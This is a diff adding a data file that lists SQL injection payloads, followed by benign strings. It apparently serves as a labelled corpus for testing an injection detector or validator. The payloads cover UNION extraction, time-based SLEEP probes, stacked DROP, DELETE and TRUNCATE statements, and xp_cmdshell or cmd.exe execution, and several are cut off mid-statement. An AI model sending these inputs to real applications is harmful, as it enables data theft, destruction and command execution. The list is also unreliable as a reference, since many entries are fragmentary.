@@ -1,0 +1,100 @@
+' UNION SELECT user, pass;--  
+' OR SLEEP(5) /*test*/--  
+'; DROP TABLE logs;--#  
+' AND 1=CONVERT(int,1);--  
+'/**/OR/**/'1'='1'/*x*/  
+' UNION ALL SELECT 1,2;--  
+'; EXEC('cmd.exe /c');--  
+' OR '1'='1' /*bypass*/  
+'; INSERT INTO users;--  
+'||pg_sleep(5) /*x*/  
+' AND 1=2 /*injection*/  
+'%55NION SELECT user();--  
+' OR 'a'='a' /*payload*/  
+' UNION SELECT @@version;  
+'; DELETE FROM logs;--  
+' CHR(97)||'admin';--  
+'||(SELECT 0x414243);--  
+' OR 1=1; DROP TABLE#  
+'; UPDATE users SET 1;  
+' CONVERT(int,@@#x  
+' OR IF(1=1,SLEEP(5))  
+'/**/AND 1=1 /*x*/#  
+' UNION SELECT table_name  
+'; EXEC('ls -l');--  
+' OR 'admin'='admin  
+' AND 1=1 /*test*/--  
+' OR 2+2=4 /*true*/  
+'%20UNION%20SELECT#  
+'; TRUNCATE logs;--  
+' OR 'x'='x' /*x*/  
+'/**/SLEEP(5)/*x*/  
+'; GRANT ALL TO root  
+' OR 1=1; EXEC('cmd  
+' UNION SELECT USER();  
+' AND 1=1 /*true*/  
+'; CREATE TABLE x;--  
+' OR 'true'='true'  
+'||(SELECT 'test');  
+' OR HEX(1)=0x31;--  
+'; ALTER USER admin  
+' OR ASCII('a')=97  
+'/**/DROP TABLE logs  
+'; REVOKE ALL;--  
+' OR BIN(1)=1;--  
+' UNION LOAD_FILE('  
+'; SHUTDOWN;--#  
+' OR CHAR(65)='A  
+'/**/EXEC('x');--  
+' OR 1=1; DELETE#  
+' UNION EXEC('cmd  
+'; xp_cmdshell('  
+' OR MD5('a')=  
+'/**/WAITFOR DELAY  
+'; DECLARE @x INT  
+' OR '1'='1'#x  
+'; BACKUP DB;--  
+' OR VERSION();  
+'/**/INSERT INTO  
+'; DUMP DATA;--  
+' OR 'root'='x  
+' UNION CMD('x');  
+'; RANDOMIZE;--  
+' OR 1=1; UPDATE  
+'/**/DELETE FROM  
+' OR 1=1; SELECT
+' OR 2=2; UPDATE
+' OR 2=2; SELECT
+' OR 3=3; UPDATE
+' OR 4=4; SELECT
+' OR 5=5; UPDATE  
+User123  
+user1329
+USerwklrewkl12390
+SELECT * FROM products  
+price: $19.99  
+apple, banana  
+Hello, how are you?  
+Good morning...  
+Testing: @example.com  
+123-456-7890  
+user@domain.com  
+Lorem ipsum dolor  
+Sed viverra quam  
+Curabitur auctor  
+Donec tincidunt  
+Order ID: 12345  
+User email: test  
+INSERT INTO logs  
+UPDATE orders SET  
+Terms & Conditions  
+Hello, please login  
+SELECT product_name  
+Password1234  
+Order placed!  
+#Hashtag  
+User.name+123  
+Price: $99.99  
+UPDATE products  
+DELETE FROM users  
+INSERT INTO users  
